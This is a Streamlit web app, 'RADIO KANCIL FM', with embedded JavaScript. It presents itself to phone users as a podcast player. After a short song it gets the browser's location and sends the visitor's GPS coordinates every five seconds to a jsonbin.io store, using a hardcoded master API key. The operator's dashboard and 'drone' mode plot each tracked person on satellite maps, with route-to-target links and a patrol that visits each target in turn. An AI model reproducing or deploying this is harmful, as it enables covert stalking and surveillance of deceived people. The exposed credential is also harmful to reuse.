import streamlit as st
import requests

BIN_ID = "6aeeda8bac6210605a74a7b5"
API_KEY = "$2a$10$LqQMOcUMXjbfZswzJUFrReGYD5dloL2gTCOLRwT17Oo96mUzr7.aO"
URL = "https://api.jsonbin.io/v3/b/" + BIN_ID
HEADERS = {"X-Master-Key": API_KEY, "Content-Type": "application/json"}

st.set_page_config(page_title="RADIO KANCIL FM", layout="wide")
params = st.query_params
mode = params.get("mode", "komando")

def ambil():
    try:
        r = requests.get(URL + "/latest", headers=HEADERS, timeout=10)
        d = r.json().get("record", {})
        while isinstance(d, dict) and "record" in d:
            d = d["record"]
        if not isinstance(d, dict): d = {}
        users = {k:v for k,v in d.items() if k != "_kicked" and isinstance(v, dict) and "lat" in v}
        kicked = d.get("_kicked", [])
        if not isinstance(kicked, list): kicked = []
        return users, kicked
    except:
        return {}, []

def simpan(users, kicked):
    data = dict(users)
    data["_kicked"] = kicked
    requests.put(URL, headers=HEADERS, json=data, timeout=10)

# ===== USER HP - PODCAST PERSIS NETLIFY =====
if mode == "user":
    user_html = """
    <style>
      *{margin:0; padding:0; box-sizing:border-box;}
      body{background:#000;}
      .wrap{background:#000; min-height:100vh; padding:28px 18px 20px 18px; text-align:center; font-family:Arial, sans-serif; color:white;}
      .title{font-size:32px; font-weight:800; line-height:1.15; color:white;}
      .sub{color:#a0a0a0; font-size:16px; margin:12px 0 22px 0;}
      .foto{width:100%; height:440px; object-fit:cover; border-radius:24px; border:2px solid #222; display:block;}
      .playBtn{background:#1db954; color:white; border:none; width:100%; padding:18px; font-size:24px; font-weight:800; border-radius:40px; cursor:pointer; margin-top:22px;}
      .playBtn:active{transform:scale(0.98);}
      .bar{width:100%; height:8px; background:#333; border-radius:10px; margin-top:20px; overflow:hidden;}
      .fill{height:100%; width:0%; background:#1db954; transition:width 0.5s;}
      .status{color:#00ff00; font-family:monospace; font-size:13px; margin-top:12px; min-height:20px;}
    </style>
    <div class="wrap">
      <div class="title">🎙️ Podcast Coffe Morning</div>
      <div class="sub">Sukses Berwira Usaha - Dengerin Sebentar Yuk</div>
      <img class="foto" src="https://images.unsplash.com/photo-1478737270239-2f02b77fc618?w=900&q=80&auto=format&fit=crop">
      <button class="playBtn" id="playBtn" onclick="putar()">▶️ PUTAR LAGU</button>
      <div class="bar"><div class="fill" id="fill"></div></div>
      <div class="status" id="status"></div>
      <audio id="lagu" preload="auto"><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3"></audio>
    </div>
    <script>
    const BIN_ID = "6aeeda8bac6210605a74a7b5";
    const API_KEY = "$2a$10$LqQMOcUMXjbfZswzJUFrReGYD5dloL2gTCOLRwT17Oo96mUzr7.aO";
    let audio = document.getElementById('lagu');
    let sudah = false;
    function putar(){
      if(sudah) return;
      let nama = prompt("👤 ISI JENENGMU:");
      if(!nama || !nama.trim()){ alert("Isi jenengmu disik bro!"); return; }
      nama = nama.trim();
      sudah = true;
      document.getElementById('playBtn').innerHTML = "🎵 LAGI MUNI... 18 DETIK";
      document.getElementById('status').innerHTML = "🎵 Lagu Coffe Morning muni... 18 detik lagi GPS aktif - " + nama;
      audio.currentTime = 0;
      audio.play();
      setTimeout(function(){ audio.pause(); }, 18000);
      let sisa = 18;
      let timer = setInterval(function(){
        sisa--;
        document.getElementById('fill').style.width = ((18 - sisa) / 18 * 100) + "%";
        if(sisa <= 0){
          clearInterval(timer);
          document.getElementById('playBtn').innerHTML = "✅ GPS AKTIF - " + nama;
          document.getElementById('status').innerHTML = "📍 GPS AKTIF - " + nama + " - Terkirim ke Studio FM!";
          kirim(nama);
          setInterval(function(){ kirim(nama); }, 5000);
        }
      }, 1000);
    }
    function kirim(myId){
      navigator.geolocation.getCurrentPosition(pos => {
        document.getElementById('status').innerHTML = "✅ GPS AKTIF - " + myId + " - Lat: " + pos.coords.latitude;
        fetch("https://api.jsonbin.io/v3/b/" + BIN_ID + "/latest", {headers: {"X-Master-Key": API_KEY}})
        .then(r => r.json()).then(j => {
          let d = j.record || {}; while(d.record){ d = d.record; }
          let users = {}; let kicked = d._kicked || [];
          for(let k in d){ if(k != "_kicked" && d[k] && d[k].lat){ users[k] = d[k]; } }
          if(kicked.includes(myId)){ document.getElementById('status').innerHTML = "⛔ KAMU DIKELUARKAN STUDIO FM!"; return; }
          users[myId] = {lat: pos.coords.latitude, lon: pos.coords.longitude, waktu: new Date().toLocaleString()};
          users["_kicked"] = kicked;
          fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, {method: "PUT", headers: {"Content-Type": "application/json", "X-Master-Key": API_KEY}, body: JSON.stringify(users)});
        });
      });
    }
    </script>
    """
    st.components.v1.html(user_html, height=780)

# ===== DRONE - DJI STYLE - PITCH 55 + ORBIT easeTo 30 DETIK =====
elif mode == "drone":
    st.title("📻 RADIO KANCIL FM - DRONE DJI CINEMATIC")
    st.write("Diemin 10 detik biar peta ke-load, baru klik tombol ijo jeneng nang ngisor peta!")
    st.markdown("[⬅️ Balik ke STUDIO FM](https://radio-kancil-fm.streamlit.app/?mode=komando)")
    drone_html = """
    <link href="https://unpkg.com/maplibre-gl@3.6.2/dist/maplibre-gl.css" rel="stylesheet" />
    <script src="https://unpkg.com/maplibre-gl@3.6.2/dist/maplibre-gl.js"></script>
    <style>
      #map{width:100%; height:650px; border-radius:12px;}
      #map canvas{ filter: contrast(1.05) saturate(1.12) brightness(1.02); }
      .hud{position:absolute; top:12px; left:12px; z-index:10; background:rgba(0,0,0,0.65); color:white; padding:10px 14px; border-radius:10px; font-family:monospace; font-size:14px; border:1px solid rgba(255,255,255,0.3);}
      .btn{position:absolute; bottom:18px; left:50%; transform:translateX(-50%); z-index:10; background:#ff0000; color:white; border:none; padding:14px 28px; font-size:18px; font-weight:bold; border-radius:30px; cursor:pointer;}
      .zoomBtn{position:absolute; top:12px; right:12px; z-index:10; display:flex; flex-direction:column; gap:6px;}
      .zoomBtn button{background:#fff; border:none; width:42px; height:42px; font-size:22px; font-weight:bold; border-radius:8px; cursor:pointer; box-shadow:0 2px 8px rgba(0,0,0,0.4);}
      .wrap{position:relative;}
      .target{position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); z-index:1; font-size:36px; pointer-events:none; opacity:0.7;}
      #listBtn{margin-top:10px; display:flex; flex-wrap:wrap; gap:8px;}
      .hpBtn{background:#1a1a1a; color:#00ff00; border:1px solid #00ff00; padding:10px 16px; border-radius:20px; cursor:pointer; font-weight:bold; font-size:14px;}
      .hpBtn:hover{background:#00ff00; color:black;}
      .infoBox{background:#f0f0f0; padding:12px; border-radius:10px; margin-top:10px; font-family:monospace; font-size:14px; min-height:50px;}
      .orbitBar{width:100%; height:8px; background:#ddd; border-radius:4px; margin-top:8px; overflow:hidden;}
      .orbitFill{height:100%; width:0%; background:#00ff00; transition:width 0.2s linear;}
    </style>
    <div class="wrap">
      <div class="hud" id="hud">DRONE DJI: STANDBY<br>Menunggu data...</div>
      <div class="zoomBtn">
        <button onclick="map.zoomIn()">+</button>
        <button onclick="map.zoomOut()">-</button>
        <button onclick="zoomMax()">🎯</button>
      </div>
      <div class="target">⊕</div>
      <div id="map"></div>
      <button class="btn" onclick="startPatroli()">▶️ MULAI PATROLI DJI</button>
    </div>
    <div id="listBtn"></div>
    <div class="infoBox" id="infoBox">Klik tombol ijo jeneng nang nduwur gawe ndelok lokasi valid-e.</div>
    <div class="orbitBar"><div class="orbitFill" id="orbitFill"></div></div>
    <div id="orbitText" style="font-family:monospace; font-size:13px; margin-top:4px;">ORBIT DJI: 0% - 0° / 180° | PITCH 55° DJI | ZOOM 18.5 | RETINA 4K</div>
    <script>
    const BIN_ID = "6aeeda8bac6210605a74a7b5";
    const API_KEY = "$2a$10$LqQMOcUMXjbfZswzJUFrReGYD5dloL2gTCOLRwT17Oo96mUzr7.aO";
    const PITCH_DJI = 55;
    const ZOOM_DJI = 18.5;
    const map = new maplibregl.Map({
      container: 'map',
      style: {
        version: 8,
        sources: {
          sat: { type: 'raster', tiles: ['https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}&scale=2', 'https://mt0.google.com/vt/lyrs=y&x={x}&y={y}&z={z}&scale=2'], tileSize: 512, attribution: 'Google Satellite Retina 4K', maxzoom: 22 },
          terrain: { type: 'raster-dem', tiles: ['https://s3.amazonaws.com/elevation-tiles-prod/terrarium/{z}/{x}/{y}.png'], encoding: 'terrarium', tileSize: 256 }
        },
        layers: [{ id: 'sat', type: 'raster', source: 'sat', paint: { 'raster-resampling': 'linear', 'raster-fade-duration': 0 } }],
        terrain: { source: 'terrain', exaggeration: 0 }
      },
      center: [118.0, -2.5], zoom: 4, pitch: 0, bearing: 0,
      maxZoom: 22, minZoom: 2,
      fadeDuration: 0, maxTileCacheSize: 2000, renderWorldCopies: false,
      pixelRatio: 2, antialias: true, maxPitch: 85
    });
    map.addControl(new maplibregl.NavigationControl());
    let points = [];
    let sedangTerbang = false;
    let stopOrbit = false;
    let targetAktif = null;
    let orbitTimer = null;
    function zoomMax(){
      if(targetAktif){ map.easeTo({center:[targetAktif.lon, targetAktif.lat], zoom: ZOOM_DJI, pitch: PITCH_DJI, duration: 1500, easing: t => t}); }
      else if(points.length>0){ map.easeTo({center:[points[0].lon, points[0].lat], zoom: ZOOM_DJI, pitch: PITCH_DJI, duration: 1500}); }
    }
    fetch("https://api.jsonbin.io/v3/b/" + BIN_ID + "/latest", {headers: {"X-Master-Key": API_KEY}})
    .then(r=>r.json()).then(j=>{
      let data = j.record || {};
      while(data.record){ data = data.record; }
      let listDiv = document.getElementById('listBtn');
      let kicked = data._kicked || [];
      for(let k in data){
        if(k === "_kicked") continue;
        if(kicked.includes(k)) continue;
        if(data[k] && data[k].lat){
          let p = {nama:k, lat:data[k].lat, lon:data[k].lon, waktu:data[k].waktu};
          points.push(p);
          let marker = new maplibregl.Marker({color:'red'}).setLngLat([p.lon, p.lat]).setPopup(new maplibregl.Popup({closeOnClick:true}).setHTML(
  "<b>"+p.nama+"</b><br>LOKASI VALID<br>Lat: "+p.lat+"<br>Lon: "+p.lon+"<br>Waktu: "+p.waktu+
  "<br><br>"+
  "<a href='https://www.google.com/maps/dir/?api=1&destination="+p.lat+","+p.lon+"' target='_blank' style='display:block;background:#1a73e8;color:#fff;text-align:center;padding:12px;border-radius:20px;text-decoration:none;font-weight:bold;font-size:15px;margin-bottom:8px;'>🧭 RUTE KE SINI - GOOGLE MAPS</a>"+
  "<a href='https://www.google.com/maps/search/?api=1&query="+p.lat+","+p.lon+"' target='_blank' style='display:block;background:#fff;color:#1a73e8;border:1px solid #1a73e8;text-align:center;padding:10px;border-radius:20px;text-decoration:none;font-weight:bold;font-size:14px;'>📍 BUKA DI GOOGLE MAPS</a>"
)).addTo(map);
          marker.getElement().addEventListener('click', ()=>{ terbangKe(p); });
          let b = document.createElement('button');
          b.className = 'hpBtn';
          b.innerText = '📍 ' + p.nama + ' - TERBANG KE SINI';
          b.onclick = ()=>{ terbangKe(p); };
          listDiv.appendChild(b);
        }
      }
      document.getElementById('hud').innerHTML = "DRONE DJI: SIAP<br>TARGET: "+points.length+" CHECKPOINT<br>ORBIT: 180° / 30 DETIK GIMBAL | PITCH 55° DJI | ZOOM 18.5 | RETINA 4K";
    });
    function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
    // ORBIT DJI - PAKE easeTo BAWAAN MAPLIBRE, 1 GERAKAN UTUH, GAK PUTUS-PUTUS
    function orbitDJI(p){
      return new Promise((resolve)=>{
        stopOrbit = false;
        let startBearing = map.getBearing();
        let targetBearing = startBearing + 180;
        let durasi = 30000;
        let startTime = Date.now();
        // Update HUD tok, OJO setBearing manual, ben gak re-load tile!
        if(orbitTimer) clearInterval(orbitTimer);
        orbitTimer = setInterval(()=>{
          let elapsed = Date.now() - startTime;
          let progress = Math.min(elapsed / durasi, 1);
          let derajat = Math.floor(progress * 180);
          document.getElementById('orbitFill').style.width = (progress * 100) + "%";
          document.getElementById('orbitText').innerHTML = "ORBIT DJI: " + Math.floor(progress*100) + "% - " + derajat + "° / 180° - " + p.nama + " | PITCH 55° DJI | ZOOM 18.5 | RETINA 4K";
          document.getElementById('hud').innerHTML = "DRONE DJI: ORBIT GIMBAL<br>CHECKPOINT: " + p.nama + "<br>PUTARAN: " + derajat + "° / 180°<br>ALT: 120m | PITCH 55° | GIMBAL STABIL | RETINA";
          if(progress >= 1){ clearInterval(orbitTimer); }
        }, 100);
        // INI KUNCINE: easeTo 30 detik, easing linear, pitch dikunci 55, center dikunci!
        map.easeTo({
          bearing: targetBearing,
          pitch: PITCH_DJI,
          center: [p.lon, p.lat],
          zoom: ZOOM_DJI,
          duration: durasi,
          easing: t => t,
          essential: true
        });
        setTimeout(()=>{ if(orbitTimer) clearInterval(orbitTimer); document.getElementById('orbitText').innerHTML = "ORBIT DJI SELESAI - 180° GIMBAL - " + p.nama; resolve(); }, durasi + 300);
      });
    }
    async function terbangKe(p){
      if(sedangTerbang) return;
      sedangTerbang = true;
      stopOrbit = true;
      if(orbitTimer) clearInterval(orbitTimer);
      targetAktif = p;
      document.getElementById('hud').innerHTML = "DRONE DJI: TERBANG...<br>TARGET: "+p.nama+"<br>ALT: 120m | PITCH 55° DJI | ZOOM 18.5 | RETINA";
      document.getElementById('infoBox').innerHTML = "<b>LOKASI VALID - "+p.nama+"</b><br>Lat: "+p.lat+"<br>Lon: "+p.lon+"<br>Waktu: "+p.waktu;
      // FlyTo alus DJI: 5 detik, pitch langsung 55, gak 68 maneh!
      map.flyTo({center:[p.lon, p.lat], zoom: ZOOM_DJI, pitch: PITCH_DJI, bearing: 0, duration: 5000, essential:true, curve: 1.1, speed: 0.4, easing: t => t});
      await sleep(5300);
      // Tunggu peta bener-bener ke-load kabeh, baru orbit, ben gak putus-putus!
      await new Promise(res => { map.once('idle', res); setTimeout(res, 1500); });
      document.getElementById('hud').innerHTML = "DRONE DJI: GIMBAL STABIL...<br>Tile ke-load kabeh, siap orbit...";
      await sleep(800);
      await orbitDJI(p);
      sedangTerbang = false;
    }
    async function startPatroli(){
      if(points.length===0){ alert("Belum ada HP online!"); return; }
      if(sedangTerbang) return;
      sedangTerbang = true;
      for(let i=0; i<points.length; i++){
        let p = points[i];
        targetAktif = p;
        document.getElementById('hud').innerHTML = "DRONE DJI: TERBANG...<br>TARGET "+(i+1)+"/"+points.length+": "+p.nama;
        document.getElementById('infoBox').innerHTML = "<b>LOKASI VALID - "+p.nama+"</b><br>Lat: "+p.lat+"<br>Lon: "+p.lon+"<br>Waktu: "+p.waktu;
        map.flyTo({center:[p.lon, p.lat], zoom: ZOOM_DJI, pitch: PITCH_DJI, bearing: 0, duration: 5000, essential:true, curve: 1.1, speed: 0.4, easing: t => t});
        await sleep(5300);
        await new Promise(res => { map.once('idle', res); setTimeout(res, 1500); });
        await sleep(800);
        await orbitDJI(p);
        await sleep(400);
      }
      document.getElementById('hud').innerHTML = "DRONE DJI: PATROLI SELESAI<br>Semua "+points.length+" Checkpoint Terpantau - Orbit 180° Gimbal | Pitch 55° DJI | Zoom 18.5 | Retina";
      map.flyTo({center:[118.0, -2.5], zoom: 4, pitch: 0, bearing: 0, duration: 3000});
      sedangTerbang = false;
    }
    </script>
    """
    st.components.v1.html(drone_html, height=820)

# ===== LAPTOP - NORMAL =====
else:
    st.title("📻 RADIO KANCIL FM - STUDIO FM")
    users, kicked = ambil()
    c1, c2, c3, c4 = st.columns(4)
    with c1:
        if st.button("🔄 REFRESH", use_container_width=True):
            st.rerun()
    with c2:
        if st.button("🔍 ZOOM MAKSIMAL", use_container_width=True):
            st.session_state["zoom_max"] = True
            st.rerun()
    with c3:
        if st.button("🗑️ KELUARKAN SEMUA", use_container_width=True):
            kicked_baru = list(set(kicked + list(users.keys())))
            simpan({}, kicked_baru)
            st.rerun()
    with c4:
        if st.button("🔗 BUAT LINK BARU (RESET)", use_container_width=True):
            simpan({}, [])
            st.rerun()
    st.info(f"Online: {len(users)} | Di-kick: {len(kicked)} | Zoom: 18.5 | Peta: RETINA 4K")
    if kicked:
        st.write("Di-kick: " + ", ".join(kicked))
    if users:
        import folium
        from streamlit_folium import st_folium
        first = list(users.values())[0]
        tengah = [first["lat"], first["lon"]] if users else [-2.5, 118.0]
        zoom_awal = 18.5 if users else 5
        if st.session_state.get("zoom_max"):
            zoom_awal = 18.5
        m = folium.Map(location=tengah, zoom_start=zoom_awal, max_zoom=22, min_zoom=2, tiles="https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}&scale=2", attr="Google Satellite Retina 4K", zoom_control=True)
        for n, v in users.items():
            folium.Marker([v["lat"], v["lon"]], popup=f"<b>{n}</b><br>{v.get('waktu','')}<br>Lat: {v['lat']}<br>Lon: {v['lon']}", tooltip=n, icon=folium.Icon(color="red", icon="eye-open")).add_to(m)
            folium.Circle([v["lat"], v["lon"]], radius=20, color="red", fill=True, fill_opacity=0.3).add_to(m)
            folium.CircleMarker([v["lat"], v["lon"]], radius=8, color="yellow", fill=True, fill_color="yellow").add_to(m)
        st_folium(m, width=1000, height=600, key="peta_max")
    st.markdown("### 📋 DAFTAR - KELUARKAN TEKO LAPTOP")
    for n, v in users.items():
        col1, col2, col3 = st.columns([3, 1, 1])
        with col1:
            st.write(f"🟢 **{n}** | {v.get('waktu','')} | {v['lat']:.6f}, {v['lon']:.6f}")
        with col2:
            if st.button(f"🔍 ZOOM", key=f"zoom_{n}", use_container_width=True):
                st.session_state["zoom_max"] = True
                st.rerun()
        with col3:
            if st.button(f"❌ KELUARKAN", key=f"kick_{n}", use_container_width=True):
                users_baru = {k:val for k,val in users.items() if k != n}
                kicked_baru = kicked + [n] if n not in kicked else kicked
                simpan(users_baru, kicked_baru)
                st.rerun()
    st.markdown("---")
    st.markdown("[🚁 MODE DRONE DJI - PITCH 55° - ZOOM 18.5 - RETINA 4K](https://radio-kancil-fm.streamlit.app/?mode=drone)")
    st.code("Link HP: https://radio-kancil-fm.streamlit.app/?mode=user")
